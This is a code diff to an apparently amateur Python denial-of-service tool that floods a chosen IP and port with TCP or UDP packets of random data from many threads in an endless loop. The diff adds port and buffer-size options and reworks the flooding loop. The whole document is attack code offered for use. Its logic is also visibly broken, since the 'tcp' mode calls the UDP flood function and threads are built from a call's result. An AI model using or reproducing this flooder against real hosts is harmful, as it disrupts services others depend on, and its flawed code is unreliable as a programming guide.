@@ -1,7 +1,7 @@
 #
 # Modules
 #
-import os, sys, time, subprocess
+import os, sys, time, subprocess, re
 import socket
 from threading import Thread
 from colorama import Fore, Style
@@ -9,12 +9,18 @@ from argparse import ArgumentParser
 
 class Dos():
 
-    def tcp_flood(self, data, ip, port):
+    def size(self, buffer_size):
+        size = os.urandom(min(65500, buffer_size))
+        return size
+
+    def tcp_flood(self, ip, port, buffer_size):
+        data = self.size(buffer_size)
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             sock.connect((ip, port))
             sock.send(data)
 
-    def udp_flood(self, data, ip, port):
+    def udp_flood(self, ip, port, buffer_size):
+        data = self.size(buffer_size)
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
             sock.sendto(data, (ip, port))
 
@@ -50,59 +56,60 @@ class Controller(Dos):
     def arguments(self):
         parser = ArgumentParser(description=self.banner_txt)
         parser.add_argument("-t", "--target", dest="target_addr")
+        parser.add_argument("-p", "--port", dest="port")
         parser.add_argument("-m", "--mode", dest="dos_mode")
         parser.add_argument("-a", "--amount", dest="amount")
-        parser.add_argument("ssl", nargs="?", dest="ssl")
+        parser.add_argument("-bs", "--buffer-size", dest="buffer_size")
         args = parser.parse_args()
         _true = self.check_args(args)
         if _true:
-            if args.ssl:
-                return args.target_addr, args.dos_mode, args.amount, args.ssl
-            else:
-                return args.target_addr, args.dos_mode, args.amount, False
+            return args.target_addr, args.port, args.dos_mode, args.amount, args.buffer_size
 
     def check_args(self, args):
-        if args.target_addr and args.dos_mode and args.amount:
-            return True
+        if args.target_addr and args.port and args.dos_mode and args.amount and args.buffer_size:
+            try:
+                args.port = int(args.port)
+                args.buffer_size = bytes(args.buffer_size, encoding="utf-8")
+                return True
+            except ValueError as ex:
+                print("Wrong Value: ", ex)
+                sys.exit(0)
         else:
             print("Use -h or --help for futher information")
             sys.exit(0)
 
     def get_fqdm(self, target_addr):
-        target_ip = socket.gethostbyname(target_addr)
-        return target_ip
+        try:
+            target_ip = socket.gethostbyname(target_addr)
+            return target_ip
+        except socket.gaierror as ex:
+            print("Please define target in IP or [www.domain.com] format :", ex)
+            sys.exit(0)
 
-    def get_port(self, ssl):
-        if ssl:
-            port = 443
-        else:
-            port = 80
-        return port
+    def threads(self, amount, dos_mode, target_ip, port, buffer_size):
+        while True:
+            if dos_mode == 'tcp':
+                self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+            elif dos_mode == 'udp':
+                self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+            for thread in range(int(amount)+1):
+                thread = Thread(self.dos(target_ip, port, buffer_size))
+                print("[{}] Starting Thread to target [{}]".format(thread, target_ip))
+                try:
+                    if thread.start():
+                        print("MODE: [{}] THREAD: [{}] » Sucessfully send packets with size [{}] to target [{}]".format(dos_mode, thread, buffer_size, target_ip))
+                except Exception:
+                    print("Error in [{}]".format(thread))
+                    continue
+                except KeyboardInterrupt:
+                    print("DDOS EXIT - you pressed ctrl+c")
+                    sys.exit(0)
 
-    def gen_data(self):
-        data = 1
-        return data
-
-    def threads(self, amount, dos_mode, data, target_ip, port):
-        if dos_mode == 'tcp':
-            self.dos = self.tcp_flood(data, target_ip, port)
-        elif dos_mode == 'udp':
-            self.dos = self.udp_flood(data, target_ip, port)
-        for thread in range(amount+1):
-            thread = Thread(self.dos)
-            print("Starting Thread [{}]".format(thread))
-            try:
-                if thread.start():
-                    print("Sucessfully started [{}]".format(thread))
-            except Exception:
-                continue
 
     def run(self):
-        target_addr, dos_mode, amount, ssl = self.arguments()
+        target_addr, port, dos_mode, amount, buffer_size = self.arguments()
         target_ip = self.get_fqdm(target_addr)
-        port = self.get_port(ssl)
-        data = self.gen_data()
-        self.threads(amount, dos_mode, data, target_ip, port)
+        self.threads(amount, dos_mode, target_ip, port, buffer_size)
 
 if __name__ == "__main__":
     cc = Controller()
